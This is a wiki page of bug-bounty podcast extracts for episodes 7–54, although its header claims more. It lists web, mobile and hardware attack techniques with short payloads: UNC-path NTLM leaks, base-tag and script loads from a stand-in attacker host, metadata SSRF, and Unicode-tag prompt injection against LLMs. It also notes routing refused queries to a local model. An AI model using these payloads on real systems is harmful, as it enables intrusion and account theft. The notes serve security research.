---
title: Critical Thinking Podcast — full whisper-transcript ingest (eps 7–173)
slug: ct-whisper-extracts
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [source/podcast/ct, ingest/whisper]
inbound: []
---

# Critical Thinking Podcast — per-episode technical extracts

Ingest run 2026-05-13 over `wiki/sources/podcasts/ct/whisper/transcripts/*.txt`.
72 episodes processed (eps 7–71 + 168–173 + AI-bias clip) across 8 parallel
extraction agents (B1–B8). Each section captures techniques, payloads, tool
quirks, target intel, and references. Cross-links to wiki pages are added
where the technique was promoted to its own page.

---

## Ep 7 — PortSwigger Top 10 / TruffleSec Drama
- Sam Curry universal Next.js/Netlify IPX SSRF→XSS via `/_ipx/w_200/<url-encoded https://attacker/x.svg>`; protocol-allowlist bypassed by stuffing full URL into `exportedProtocol` header parsed from URL with `?`/`#` truncation.
- Hop-by-hop header smuggling: `Connection: <hop-header>` forces front proxy to strip header before back-end sees it. Jacopo Tediosi on Akamai. See [[hop-by-hop-smuggling]].
- James Kettle CRLF in request-line: URL-encode `\r\n` (`%0D%0A`) in path, server URL-decodes and parses two requests.
- ECDSA all-zero R/S signature bypass on Java 15–18 (CVE-2022-21449). See [[jwt-zero-ecdsa-bypass]].
- Mehdi CSPT chain: client-side path-traversal + open-redirect + dynamic CSS load → attacker-CSS exfil of CSRF tokens.
- Open-redirect via slash permutations (`//`, `\\`, mixed) — fuzz redirect regexes.
- Tools: Wycheproof (Google crypto test suite); cookie-monster default-signing-key check; feroxbuster v2 interactive content discovery; ffuf v2 request-tracking + match-and-extract.
- XSS Hunter (TruffleSec) PGP E2EE added after plaintext-store complaints.

## Ep 8 — PostMessage Exploits and CSS Injection
- postMessage HTML broadcast XSS: parent broadcasts raw HTML to sibling iframe via postMessage; iframe `innerHTML`. See [[postmessage-html-innerhtml]].
- CSS-keylogger credit-card via postMessage race + per-field iframe checkout — 160 unique zero-width fonts, `unicode-range` per digit, font-load HTTP fetch on keystroke. See [[css-keylogger-postmessage]].
- CSS escape blacklist bypass: `\6D` / `\00006D` for `m`. Mathias Bynens.
- Donut recursive `@import` font-load chain — near-instant exfil.
- `CSS.paintWorklet` lets JS run from CSS — underexplored.
- Account pre-creation by email on guest checkout → chain with stored XSS for ATO. See [[account-precreate-guest-checkout]].
- Tools: Franz PostMessage Tracker.

## Ep 9 — Headless Browser SSRF + Multi-A Rebind
- Headless-browser HTML injection → XSS in headless context → SSRF/metadata. See [[headless-browser-html-ssrf]].
- Multi-A DNS rebinding on Windows: two A records per host, first = attacker (kills connection), second = 127.0.0.1. `rebindmultia.com`. See [[multi-a-dns-rebind]].
- Slow-HTTP body stall: full headers + `Content-Length: 1`, never send body, exploits body-load timeout > full-response timeout. Lupin tip.
- `localhost:<remote-debug-port>/json/new?<url>` spawns two tabs (opener relationship), bypassing popup limits.
- Captive-portal jsforce on IoT — arbitrary JS in device webview.
- Fuzz every redirect code (301/302/303/307/308) — SSRF-followers often inconsistent. Mark Litchfield.
- Public Chromium V8 PoCs against headless browsers — "crashed browser" often accepted as crit.
- Tools: DNSChef, who.now (Brandon Dorsey), `chrome://inspect`, BroadcastChannel API, WASM port scanner.

## Ep 10 — Life of a Full Time Hunter
- Hash-of-query-string anti-tamper bypass via login-redirect signed-hash reuse on victim accounts.
- POST body numeric IDs are the IDOR candidate when query-string IDs were "hardened".
- IDOR with 500 side-effect: response 500 doesn't mean mutation didn't happen — verify on victim.
- `strings.xml` Japanese-named secret key (`Kagi`) decrypted hard-coded secrets.

## Ep 11 — CVSS / Web Cache Deception / SSTI
- Outlook `.msg` "play sound" UNC path → NTLMv2 hash leak. MSGKit `.NET`.
- PayPal payment-message Jinjava SSTI: `not a payload, {{1+1}}` → `66, instead of 33 times two`. CVE-2020-12668. $26K crit.
- Web cache deception via cache-buster query param — victim's response cached, attacker reads from same edge.
- ASPX `%3frandom.js` WCD trigger — cache treats response as JS asset.
- Suffix-path WCD: `/anything-<rand>.png` appended caches dynamic HTML.

## Ep 12 — Jason Haddix
- Interview, no extraction.

## Ep 13 — Acropalypse / Node Request SSRF
- Acropalypse (CVE-2023-21036) — Pixel crop / Windows Snipping Tool leave original PNG data past IEND.
- Node `request` lib: redirect HTTPS→HTTP silently drops the SSRF-filter agent.
- Pinterest P1=$25K but P2=$2.5K — 10x gap, anchor on mediums.
- Program-evaluation framework: launch-date + total-bounty + 90-day stats + scope + rank-1-vs-rank-2 gap.
- ZDI Pwn2Own exploit must trigger in 5 min on fresh device — race conditions/brute often DQ'd.
- Tools: aws-scrape (Jason Haddix); SSRF Sheriff canary (Joel/Uber/Frans); Shopify seeds test data on `@we-are-hackerone.com` signup.

## Ep 14 — Mobile Frida
- Universal Android SSL pinning bypass: hook OkHTTP3 `CertificatePinner.check`, TrustKit, default TrustManager, NSC at lowest level — return void instead of throw.
- Custom-cert-pinning discovery: search-back from on-screen error string → `strings.xml` → R.string ID → Java code path; fallback grep adb logcat by PID.
- `TLSConfig.setVerifyServer(false)` Frida hook → ATO via care-team `impersonate` endpoint.
- Frida-on-non-rooted via APK patch: inject `frida-gadget.so` + smali `System.loadLibrary("gadget")` + resign.
- `registerNatives` race: wrap `Java.perform` hook in `setInterval` try/catch, retry until `System.loadLibrary` populates symbol.
- Space-raccoon hex-patch a single char in native `.so` to bypass check when repackage too painful.
- SafetyNet/Play Integrity = kernel-signed, server-verified, effectively unbypassable.
- Tools: JADX-GUI right-click "Copy as Frida snippet"; objection; apktool; root-avd; `setenforce 0`; `data/local/tmp` for frida-server; `frida-server -D`; bettercap BLE; scrcpy; `adb reverse`; burp-vps-proxy; fireprox; Flipper Zero.

## Ep 15 — Gal Nagli
- EC2 IP-takeover rotation: rotate EC2 IPs across attacker AWS, cross-ref recon DNS dataset for stale A records.
- Nameserver takeover Route53/GCP — 3–5/month at $1–2K each.
- Log4j-mass-scan 2-hour push for $10K bounties × N — recon pipeline must be hot.
- Vendor-pivot collab — direct-signup to mutual SaaS vendor → $64K.
- Shockwave (Nagli ASM) — internal-DNS pull from clients.

## Ep 16 — The Hacker's Toolkit
- Dirbruteforce cookie side-effects on legacy JSP/Tomcat — second hit sets admin session cookie.
- AT&T/Jasper portal upstream-API-token leaked via verbatim error response → 200M SIMs.
- SSRF response body rendered as HTML → try Node EJS `<%= %>` template injection → RCE.
- Unicode SSO normalization: register `adminª@gmail.com` (U+00AA ª) → SSO normalizes ª→a → log in as `admin@gmail.com` on app B. See [[unicode-sso-normalize]].
- Subdomain takeover net-new SaaS — pay entry fee, register, try to claim orphan name.
- Tools: easyXSS pulls localStorage/sessionStorage out of the box.

## Ep 17 — Live Chat with Legendary Hackers in LA
- Home Assistant RCE: reverse-proxy path-traversal back to `auth: false` integrations.
- Git config 1024-byte line split (0xACB / Ethihack): plant duplicate `[core]` past byte 1024 → `git submodule update` runs your command.
- Cookie smuggling via empty name: `Set-Cookie: =foo=bar` → parser confusion.
- Cookie ordering attack (path/domain priority — first match wins).
- `__Host-` / `__Secure-` prefixes change browser-enforced attributes regardless of flags.
- PHP `.` ↔ `_` conversion in param names — `__Host-` collision bypass.
- CSRF content-type swap (`application/json` → `text/plain` / `x-www-form-urlencoded`) drops preflight.
- DevTools v112+ "ignore third-party scripts" cleans webpack source-map trees.

## Ep 18 — Source Review Pt 1
- Pentaho is reliably preauth-RCE — keep recon list.
- LFD → pull `.dll`/`.jar`/`.pyc`/`.NET` binaries → decompile.
- Docker image source pull: `FROM <target-image>` then `ENTRYPOINT bin/bash`, or `docker cp` running fs.
- NPM/PyPI private packages off-GitHub — pull tarball, grep secrets/internal hosts.
- `vendors.js` / source maps expose `node_modules/<company>/<private>` tree.
- `.proto` files accidentally bundled in APK alongside generated `.java` — full schemas leak.
- GitHub search on internal error-string microservice names → training repos with `node_modules` + secrets.
- Tools: dotPeek (.NET); jadx; uncompyle6; VS Code todo-highlight extension as breadcrumbs.

## Ep 19 — Source Review Pt 2
- Sitecore renderer-user auth bypass: `?ec_message_id=...&ec_id=...` transitions request anonymous→authenticated as renderer user → preview controller LFD → `web.config` → Telerik machineKey → 2019 Telerik deserialization → RCE.
- SIP protocol fuzz — near-HTTP, `SIP/2.0 A A A A A A A foo` triggers mis-parse buffer overflow. Ivan Fratric.
- Cloudflared tunnels = ngrok-equivalent behind accredited domain (TLS + SSH).
- ShadowClone distributed scanner — 1000 free-tier serverless instances split input line-by-line; 150K subdomains in 3–4 min via httpx.

## Ep 20 — Bounty Burnout
- Sub-recon GPT wordlist gen: feed known subdomains to GPT, ask for "5 similar," resolve. Jason Haddix <100-line script.

## Ep 21 — Corben Leo
- DNS-rebinding state 2023: Chrome local-network access deprecation; `0.0.0.0` rebind (Singularity/Justin) still works; WebSocket-timing port scanner still works post-mitigation.
- Chrome multi-A instant rebind to `0.0.0.0` (covers loopback in many stacks).
- UUID-IDOR with CVSS AC:H still pays — reframe as "broken access control" not "IDOR".
- Internal Kubernetes hostnames sometimes get public certs/IPs in CT logs.

## Ep 22 — CHIP-ing Away at Hardware Hacking
- eMMC test-pad readout: solder onto back pads, identify CLK/CMD/DAT0 via Saleae/Digilent, read filesystem in-circuit (power chip externally to avoid CPU contention).
- Chip pull + mount: hot-air 200°C→425°C constant flux, wiggle test, AllSocket BGA-153/169 reader (~$87) or T56 universal programmer.
- eMMC RPMB read without auth key — MAC validated on read-side per spec; many impls skip.
- CPU glitching during eMMC init to skip bus claim. River Loop Security.
- Fetch-cache exfil (BitK trick, patched): `fetch` w/cookie, cache response, second fetch `cache:'force-cache'` no cookie returns cached body cross-origin.

## Ep 23 — Building Ultimate Hacker Setup
- VMware vRNI nginx location bypass: `/./SAS/REST/SAS-Servlet` → restricted servlet → "Create Support Bundle" command injection → RCE. Sina @sinsinology, Summoning Team. See [[nginx-dotslash-bypass]].
- Support-bundle / diagnostic-dump endpoints = textbook command-injection sinks.
- CCTLD/EPP server takeovers — Sam/Brett/Reese/Shubs hackcompute.com.
- Salesforce dropped consolidated public-doc bundle at H1 LHE — many endpoints undocumented; doc-vs-behavior mismatches.

## Ep 24 — Daniel Miessler & Rezo: Hacking with AI
- Metaprompter: rewrite user's terse prompt to mention experts + step-by-step + constraints, ask LLM "think step by step", then "summarize concisely" — Rezo ~10x accuracy bump.
- Tree-of-thought / chain-of-thought wrappers (Karpathy "State of GPT").
- Local LLM front-router for refused queries (Ooba on dual 4090s + agent dispatcher).
- JS deobfuscate via GPT (beautify + rename variables) — context-window-limited.
- JSON → form-urlencoded via GPT for CSRF testing ("Burp Suite Repeater post body form").
- Burp/Caido log as LangChain document loader — find auth requests, autorize-style cross-user diff.
- Documentation-knows: feed product docs to LLM, ask "list everything I shouldn't be able to do."

## Ep 25 — Inhibitor181
- One-program-mastery; gadget-collection notes per program; subscribe to changelogs for unauthenticated-bug surface before security review.
- Tool: Burp reflector plugin (modified) instead of active XSS scan.

## Ep 26 — Client-side Quirks and Browser Hacks
- Nginx alias traversal — `location` no trailing slash + `alias` trailing slash → one-dir-up traversal. Bitwarden DB leak, Google reward. See [[nginx-alias-traversal]].
- Popover-target XSS: `<button popovertarget="hiddenForm">` makes any element clickable to trigger hidden form. See [[popover-target-attribute]].
- Attribute `==""` trick: `<button popovertarget=="">` — two `=` bypasses regex sanitizers. Saroosh.
- `<math>` wrapper in Firefox makes `href="javascript:..."` clickable on any tag. See [[math-element-firefox]].
- Numeric tag comment: `<?xx>` becomes HTML comment in Chromium. See [[numeric-tag-comment]].
- WooCommerce Payments patch-diff (CVE 9.8): `X-WC-Pay-Platform-Checkout-User: 1` header → admin user.
- Dynamic `import("https://x/x.js")` works in plain browser JS (not just Node) — shortens XSS payload. CSP still applies.
- Module hijack via exporting `then` (MDN warning).
- Script-context HTML escape: injected `</script>` closes tag regardless of unterminated quote → HTML inject bypassing script-src CSP nonce.
- `<base href=//attacker>` works in `<body>` (Chrome + Safari) despite spec. See [[base-tag-anywhere]].
- Meta-refresh redirect with `data:` URI blocked by modern Safari.
- Prototype-pollution spray: pollute via `__proto__` URL params in headless browser across endpoints.
- DOM clobbering via HTMLCollection: two `<a id=someobject>` form a collection; second with `name=url href="javascript:..."` makes `someobject.url` resolve to href.
- Tools: jsluice (tomnomnom/Bishop Fox) — tree-sitter AST for URLs/paths/secrets in minified JS. Better than linkfinder. Chrome 78 dropped XSS auditor. CSP evaluator missing 2016+ gadgets.

## Ep 27 — BEST Esoteric Web Vulnerabilities
- ShareFile (Citrix) preauth RCE: `uploadId` path traversal + `parentId` AES PKCS7 padding-oracle (~128–256 brute). Asset Note.
- Chrome `localhost:9222/json` via SSRF in shared headless Chrome → enumerate other tabs.
- Google Search Appliance firmware brute (Wayback for version range) + `%0a` cmd-injection + LFD.
- IIS `shortscan` (bitquark Go rewrite) + GPT for full-filename prediction.
- Config-file injection: dnsmasq `tftp-port 69` for `/etc/passwd` TFTP read; multi-line directive "last wins".
- Client-side path traversal (CSPT) — query/hash param into `fetch()` / `<link href>` path → arbitrary `/delete-account` CSRF-equivalent. See [[cspt-fetch-hijacking]].
- Backend-id path traversal: `{"id":"<uuid>/../../api/get/<uuid>"}` returns baseline → confirms gateway concat. See [[secondary-context-path-traversal]].
- 401-injection (legacy) — open-redirect to attacker 401 to harvest creds.
- Cookie bombing: `app_cache` substitution; cookie-bomb OAuth callback so request fails 400 but URL still has `code` reachable via XSS `window.location.href`.
- Cookie-jar overflow: 150–180 cookies/domain evict oldest (incl. HttpOnly from non-HttpOnly context).
- xs-leaks: `attackerWin.frames.length` cross-origin frame count; `history.length` leaks redirect-chain hops; Chrome PDF `postMessage` cross-origin → customer enum. See [[pdf-postmessage-enum]].
- UNC path leak (Windows): `\\attacker\share\foo` → auto-auth NTLMv2 → `responder` → crack hash.
- Impactful link hijack: expired domain / unowned S3 / Heroku referenced in repo CI/README → supply-chain takeover.
- Tools: bitquark `shortscan`; responder; sqlmap `-r` raw request file; ffuf `--request`; hackbar (50K users).

## Ep 28 — CSRFs
- CARF (cross-app request forgery) — third-party Android app fires intent into target.
- TikTok QR-scanner webview JS bridge: allowlist `host.endsWith("tiktok.com")` → register `nottiktok.com` → bridge access.
- SameSite Lax-plus-POST 2-minute window after cookie set — force re-login to reset window, then top-level POST.
- Rails `match via: [:get, :post]` also routes HEAD through GET handler; `request.get?` check fails on HEAD → GitHub OAuth $25K (Teddy Katz). See [[csrf-rails-head]].
- Rails `?_method=POST` overrides verb.
- JSON CSRF via `Content-Type` swap to `text/plain` / `x-www-form-urlencoded`. See [[csrf-content-type-swap]].
- Referer-policy attacker-controlled: set `<meta name=referrer content=unsafe-url>` on attacker page → full URL with path sent → bypass `Referer.includes("site.com/")`. See [[csrf-referrer-unsafe-url]].
- 307-redirect chain CSRF — on-click + form-submit fire two top-level requests; first establishes session in legacy domain, attacker sleeps 2s then 307s preserving POST.

## Ep 29 — Sean Yeoh (AssetNote)
- Event-driven recon: pivot from "task per queue" to "event per data type" (`subdomain-resolved` triggers TLS-cert + title + tech-detect).
- Pod port-scan hits `nf_conntrack` table + double-NAT — drop pod into hostNetwork on public-IP nodes.
- NATS + KEDA recommended over RabbitMQ at scale.
- AssetNote scale: 300M+ DNS records every 5 min, single signature scanner ~80K req/s.

## Ep 30 — Shubham Shah
- IntelliJ Community for Java decompile+debug; Rider for `.NET` attach + decompile breakpoints in deployed process.
- Patch-diff entire commit set, not just advisory commit — silent fixes often bundled.
- "Don't title report as zero-day" — 90% pay when titled as plain RCE finding.
- Recon for prospective customers — research 0-days in stacks expected to appear; AssetNote model.

## Ep 31 — Alex Chapman
- Chromium 1-day during LHE: V8/JIT GitHub Security Blog research → working JS exploit in days against older fixed-version headless browser.
- LHE scope check #1: any source code / desktop app? (Electron/CEF source extraction usually trivial.)
- Methodology: <200 reports in 4.5 yrs (~4/mo); skip mediums except LHE; 1–2 highs/crits/mo target.

## Ep 32 — 5 Bug Bounty Write-ups You CANNOT Miss
- Single-packet H2 attack (James Kettle DEFCON 2023) — send all-but-last byte of N H2 requests without END_STREAM, then last bytes in one TCP packet. Burp "Send group in parallel". See [[single-packet-attack]] (existing).
- Sub-state races (race-condition pattern): user created with default admin role, then UPDATE sets correct role — window between INSERT and UPDATE = admin assignment. See [[substate-races]].
- GitLab email-confirmation race: change-email function passes destination as param but reads confirmation token from DB at render → race two change-emails → receive victim's token.
- IIS cookieless bypass (Soroush) — `/(S(x))/`, `(A(x))`, `(F(x))` path-prefix injected mid-path, stripped by `RemoveAppPathModifier` before route resolution → bypass nginx/IIS path ACL. See [[iis-cookieless-bypass]].
- IIS tilde-path XSS (Pavel/isec) — reflected resolved tilde-path containing cookieless session token → XSS in session-token segment.
- Shopify unverified-email ATO (Rojan): Shop Pay OAuth endpoint still callable when sign-in-with-shop UI disabled.
- Secondary-context IDs (Sam Curry): append `#` to UUID param → 400 with text/html error reveals secondary context. Then path-traverse → 22M-record dump.
- JWT secret `secret` (points.com) — cookie-monster.
- IIS shortname LLM completion (Monke).
- Sandwich attack on UUIDv1 (Lupin/Holmes): reset YOUR password (A), reset victim (V), reset YOUR again (C). A and C bound millisecond range, brute V within range. See [[uuidv1-sandwich]].
- Multi-auth method token-swap (Sam Curry, United mileage-plus): same token format from easy-auth → use in stronger-auth contexts.
- Pay-the-money rule: pay $20-30 for premium account, auth tokens / membership IDs often leak.

## Ep 33 — Inti De Ceukelaire
- Report-title-as-storytelling for triage attention ("results in kidnapping").
- Belgium law: unauthorized testing legal under conditions (BE citizen + BE server + post-disclosure mandatory).

## Ep 34 — Hacker vs Program Debate
- SSRF octal-encoded IP bypass: `0177.0.0.1`. See [[octal-ip-ssrf]].
- Third-party zero-day vendor reporting — include mitigations (WAF, IP restrict, take offline) for triage acceptance.
- Chrome `onscrollend` — new event handler not in WAF lists. Combine with `#elementId` URL fragment auto-scroll for zero-interaction firing.

## Ep 35 — Douglas Day (Archangel)
- Intercom widget identity bypass: `Intercom('boot', {email: 'victim@x'})` from console — loads victim support session including chat history + temp passwords. See [[intercom-widget-bypass]].
- V1 vs V2 API coexistence — fix shipped on v2 but v1 still online.
- RBAC matrix audit — spreadsheet (role × verb), cross-ref docs for "documents-say-shouldn't" reports.
- Paywall feature-by-feature: pay $20, test enterprise features one-by-one — each missing backend check = separate report.
- Match-and-replace endpoint discovery: rules turning `"is_admin": false` → `true` (and every `is_*: false→true`) in responses → UI exposes admin-only modules without minified-JS reading. See [[match-replace-admin-flag]].
- User-invite-flow priv-esc: invite myself to someone-else's org = auto-crit; invite myself with elevated perms = high.

## Ep 36 — AI 4&8 / CT Bugs
- CRLF→XSS via two `X-Content-Type-Options` headers (one valid, one invalid) — Chrome drops nosniff → content-sniff HTML.
- postMessage iframe-shim auth-bearer exfil: pop XSS, iframe same-origin page, overwrite `iframe.contentWindow.fetch` with shim leaking `Authorization: Bearer`.
- Cookie-path-priority fixation: more-specific path cookie sent first even if set from wider domain — plant reset-token cookie at `/login` + cookie-bomb `/login` so victim login fails → funnel into reset → race-set-password = ATO.
- Google AMP open-redirect `https://www.google.com/amp/s/<target>` redirects on desktop. See [[google-amp-open-redirect]].
- Mobile config `.html` URLs flagged for legacy/embedded-iframe surface.
- `overrideURL` parameter iframed in trusted parent → injected iframe postMessages → `getGeolocation` / auth-token return.

## Ep 37 — Tokyo Hacking with 0xLupin
- Lazy-loaded webpack extraction: download chunk siblings of `main.js`, statically expand — admin-only modules + A/B-testing endpoints.
- GraphQL introspection from JS: regex GraphQL identifiers from bundle → wordlist for clairvoyance. Some libs literally embed full introspection.
- UUIDv1 sandwich attack (timestamp + clock_id + MAC). Third octet first char = `1`. See [[uuidv1-sandwich]].
- IP format octal bypass: `0177.0.0.1`, hex `0x7f000001`, 32-bit decimal.
- Blind-XSS template flow: record multi-request login→cart→checkout once, mutate one request at replay with payload; if shape changes abort + restart.
- Error-based blind-XSS trigger: push app to log entries (banned IPs, malformed beacons, log4j) so payload lands in admin log-viewer.
- Tools: cursor.sh + GPT-4 — "tell me which other function you need next" iterative obfuscation reverse — 6h → 2h on Google batchexecute.

## Ep 38 — Sergey Toshin / Mobile
- Android deep-link URL-parsing bypass: `Uri.getHost()` vs string-match disagreement — `getHost()` resolves trusted but separate string-check sees attacker. See [[android-deep-link-bypass]].
- iOS-from-Android port: replay Android deep-link list against iOS — recurring "secure in Android, not iOS" wins.
- Google Play VRP: $1000/critical app vuln (100M+ installs). Report there even if developer has own bounty — faster pay, Google forces fix.
- Tools: oversecured + JADX-GUI; Kotlin/Java collapse to same Dalvik level — no special detection rules.

## Ep 39 — Web Architectures
- JWT alg none still works in 2023 — try `none`/`None`/`NONE`/`nOnE`. See [[jwt-none-algorithm]].
- SPA bearer XSS → ATO — bearer reaches client JS.
- Redirect-based XSS dominant in SPAs — URL param / postMessage / hash → `javascript:` URI.
- Secondary-context path traversal: `/user/../user/<myid>` returns own data → gateway concat → `/user/../admin/users` reachable. See [[secondary-context-path-traversal]].
- Third-party API parameter injection: URL-encode `&`/`?`/`#` in proxied param → boolean-error-based exfil.
- Microservice fingerprinting: different `Server` headers, time zones, XML-vs-JSON, 500-error structures.
- Doc-words-to-endpoint wordlist: dump user docs, POS-tag, recombine verbs+nouns into camelCased `verbNoun.aspx` — 12-bug haul.

## Ep 40 — Mentorships
- JSON key swap almost never changes server behavior — wasted time unless positional parsing.
- Beginners need browser-as-third-party model before IDOR clicks.

## Ep 41 — Attack Vector Ideation
- Use-app-like-human-not-hacker — chained to full-read SSRF on device-config page only reachable via non-default dropdown.
- Documentation-cannot statements: export full docs PDF, read for "X user cannot Y" / "limit is N" / staff-only — cite exact doc line in report.
- GitHub issues mining: search public issues for "security"/"leak"/flaky-security-ish.
- Bookmarklet removes `disabled`/`hidden` from every element → drive restricted flows + observe request shape.
- UI-vs-API diff: fields in response not rendered = intentional boundary (masked SSN last-four).
- Match-and-replace client-side flag to walk staff UI on normal account.

## Ep 42 — Intigriti LHE Recap
- NFT metadata stored XSS: mint own ERC-721 on-chain with payloads in every metadata field — bypasses platform validation that sanitises lazy-mint flows.
- Restricted charset XSS: no `.`/`(`/`+`/`'`/space, max 35 chars, twice-reflected → URL-encode dots (Johan Carlsson) + split across multiple stored entries that each render twice → concatenate.
- postMessage origin regex un-escaped dot: `https://trusted.com$` regex matches `trustedXcom`.
- Query-param reflection extension: pop alert on every reflected param. Passive vs Burp reflector.
- renniepak postMessage-tracker fork — auto-alerts on dangerous handler patterns (eval, no origin check).
- Secondary-context path guess manually 3 dirs up in 5 min beats rate-limited brute.

## Ep 43 — Is Caido Your Next HTTP Proxy
- Interview, no extraction.

## Ep 44 — URL Parsing Auth Bypass Magic
- Facebook token confusion: target accepts FB OAuth without validating app ID via FB debug — attacker app token used on target.
- FB no-email-scope ATO: login without email scope, target prompts for email, attacker enters victim's → confirmation token to victim → replay with email scope to re-route same token to attacker. See [[oauth-no-email-scope]].
- URL parsing `file://` `?` disagreement (Canva SVG): one parser sees `?` as path char, another as query → `../../etc/passwd`. 
- Userinfo bypass: `https://test.com\:@victim.com` → backslash breaks parsers → navigates to test.com.
- Path-parameter semicolon: `/test;x=1;y=2` parser disagreement (`..;` is the Orange Tsai instance).
- TLD regex dot-wildcard: `.*\.co\.jp$` matches `whatevercojp`.
- JWT cross-environment secret reuse: stage/prod or app-A/app-B shared secret. See [[jwt-cross-env-secret-reuse]].
- MFA device IDOR: bind attacker device to victim account. See [[mfa-device-idor]].
- Social-login unverified email → SSO into email-keyed apps.

## Ep 45 — Frans Rosen
- S3/GCS decloaking: invalid signed URL errors leak underlying bucket name behind CDN; side-channel HEAD/ACL/list directly. 7 GCS methods.
- CloudFront trailing-dot takeover: `card.com.` historically claimable via gRPC interception bypassing client-side dot rejection.
- OAuth dirty-dancing state break: state validation runs *before* code exchange — attacker replays leaked code with own state value. See [[oauth-dirty-dancing-state]].
- OAuth `response_mode=form_post` to subdomain that reflects POST data (e.g. `script.google.com`).
- OAuth `response_mode=web_message` postMessage relay → child iframe → XSS / window.name sink.
- GA/GTM tag user-pickable → attacker GA exfils anything snippet sees including OAuth fragments.
- 307 open-redirect chained with `form_post` forwards POST'd OAuth tokens.

## Ep 46 — SAML Ramble
- SAML signature exclusion — strip `<Signature>`, fill required attrs from SP error oracle. See [[saml-signature-exclusion]].
- XML signature wrapping (XSW) — 8 variants. SAMLRaider automates. See [[saml-xsw]].
- Certificate faking — inject attacker X.509 cert in `<KeyInfo>`.
- X.509 AIA URL → SSRF via cert chain validation. Michael Stepankin.
- XSLT pre-signature execution via `<Transform>` — XSLT Turing-complete, reads files. Project Zero 2022.
- Recipient confusion — SP doesn't validate `<SubjectConfirmationData Recipient="...">` matches itself.
- XSS in attributes: `Destination="x&lt;script&gt;..."` reflected decoded in HTML error.
- Tools: SAMLRaider Burp extension.

## Ep 47 — CSP Research / Iframe Hopping
- Iframe-sandwich cross-tab: attacker page + victim tab both iframe same `vuln.victim.com` same-origin URL; pop XSS in attacker's iframe, reach victim's iframe via `window.opener`. See [[iframe-sandwich-cross-tab]].
- Same-origin method execution JSONP CSP bypass: callback like `window.opener.document.body.firstElementChild.click` — chain CSRF click on attacker-chosen button on parent. See [[jsonp-callback-csp-bypass]].
- Iframe-without-CSP as proxy: when external `script-src` locked but `unsafe-inline` allowed, iframe same-origin asset lacking CSP header (CSS/JS/image often missing CSP), inject `<script src=attacker/x.js>`, exfil via same-origin parent. $70K. See [[iframe-without-csp-proxy]].
- JS hoisting XSS: `x.y(1, INJECTION)` where `x` undefined throws — inject `function x(){};` → hoisted, `x.y` undefined, engine parses argument list before TypeError. See [[js-hoisting-xss]].
- Next.js `_buildManifest.js` route enum.
- SPA route table from JS — Angular `RouterModule`, React Router config, Vue Router — trigger by URL nav.
- Google protobuf Burp plugin (Sam Erb) decodes without `.proto`.
- Tools: js-weasel (paid) auto-resolves Webpack chunks; xnl-reveal Chrome extension reveals hidden + enables disabled.

## Ep 48 — Sam Erb (Googler)
- Internet-wide TLS cert SAN/CN harvest — self-signed dev certs surface.
- Rapid7 Project Sonar passive-DNS (free with registration).
- XSLT via spec function-by-function for Google internal bug — generic payloads insufficient.
- Google `/amp` open redirects intentional, won't pay; JS redirect → XSS chains can pay.
- Google Abuse VRP separate from security VRP — BIMI-protocol abuse → phishing → RFC updates.

## Ep 49 — LHE Invites + Nagli
- ASP.NET `web.config` machineKey → ysoserial.net VIEWSTATE → RCE; `EnableViewState="false"` ignored since 2014. See [[aspnet-machinekey-rce]].
- DLL decompile via dotPeek to expand source after leaked zip.
- Swagger unauth API chain: list-objects → object-detail → presigned-S3 URL leak → strip suffix → directory listing → credit-card transaction data.
- PHP `==` type juggling: `0e<digits>` MD5 collision (estimated 70 days brute on pinned 1.7.4).
- Version-pin via README diff: file changes immediately preceding security commit (uppercase-h → lowercase-h) fingerprint patch.
- Nuclei default backup-files template caught `www.root.zip`.

## Ep 50 — Mathias Karlsson
- mXSS parser-mismatch fuzz: `hackaplaneten.se/parse` runs input through 16 parsers + DOMPurify. `--><!` comment-end mismatch.
- XSLT file-read with UTF-16 encoding to bypass nullbyte filter; Hackvertor charset decode.
- Secondary-context path truncation via `#` (fragment) or `?` (query) — frontend forwards in path, backend truncates.
- Host header port-uri injection: `Host: example.com:80@attacker.com` — RFC URI allows `user:pass@host:port` smuggling authority.
- Byte-order-mark injection mid-document → reinterpret as UTF-16 (or another charset) on permissive parser.
- Host-header encoded-word: `Host: =?ISO-8859-1?Q?<hex>?=` decodes server-side past nginx allowlist.
- JS `String.replace` replacement tokens (`$&`, `` $` ``, `$'`, `$N`, `$<name>`) — user-controlled replacement pulls preceding context (e.g. `"` from `<script src="...">`) → break HTML-attribute context. Frans XSS challenge.
- GraphQL subquery traversal: type→type→type to reach password-reset tokens / hashes several relations deep.
- SDK git monitor for new endpoints/types as code diffs.
- TDD-security tests in OSS source = explicit attack-vector list devs thought of.

## Ep 51 — Hacker Stats / 2024 Goals
- String.replace special tokens (recap from ep 50) — Frans XSS challenge Dec 15 2023.
- PDF render → AWS IMDS SSRF via `<iframe src=169.254.169.254>` in user HTML template — H1 analytics $25K crit. See [[aws-imds-iframe-pdf]].
- CSS `:has()` + `:not()` blind exfil with delaying-import chain (Donut + Pepe Villa + Gareth Hayes). See [[css-has-not-input-enum]].

## Ep 52 — Best Technical Content from 2023
- Meta-tag injection: `Content-Security-Policy`/`Content-Type`/`default-style`/`refresh`. `<meta http-equiv=refresh content="0;url=//attacker">` no-JS redirect.
- Base tag in body works in Chrome/Safari.
- Cookie-bombing on non-top domain (api.domain.com) — user can't clear without wiping all cookies.
- Cookie-jar overflow ~150–180 cookies evicts HttpOnly from non-HttpOnly context.
- Cross-env JWT reuse.
- MFA device IDOR.
- Iframe sandwich.
- JS hoisting.
- IIS tilde shortname; IIS machineKey; IIS SSRF→NTLM (`\\\\attacker-host\\C$\\...`); IIS virtual-dir traversal `/sso/..%2f` → root of backend.
- .NET XXE universal Windows-resident DTD.
- XSLT injection RCE.
- mXSS parser-mismatch; BOM injection; encoded-word host header.
- AES PKCS7 padding-oracle recap (ShareFile).
- Perforce client trust RCE: attacker perforce server issues `client-WriteFile` for `/etc/cron.d/anything`.

## Ep 53 — Nahamsec
- Interview.
- GitLab CVE-2023-7028: `user[email][]=victim&user[email][]=attacker` array-instead-of-string → reset email sent to both.
- Riley Goodside Unicode-tag prompt injection: chars U+E0000–U+E007F invisible but LLMs read. `chr(0xE0000 + ord(c))`.

## Ep 54 — White Box Formulas / Vulnerable Coding Patterns
Code-review smell list:
- auth-check inside `if` body, no else/return → bypass when cond false.
- bad-pattern detected but no control-flow break → sink fires before bad-flag acted on.
- sanitize-then-modify (`sanitizeHTML(x); url_decode(x)`) undoes sanitization.
- regex unescaped `.` in URL (`^github.com$` matches `githubXcom`).
- regex replacement tokens (recap).
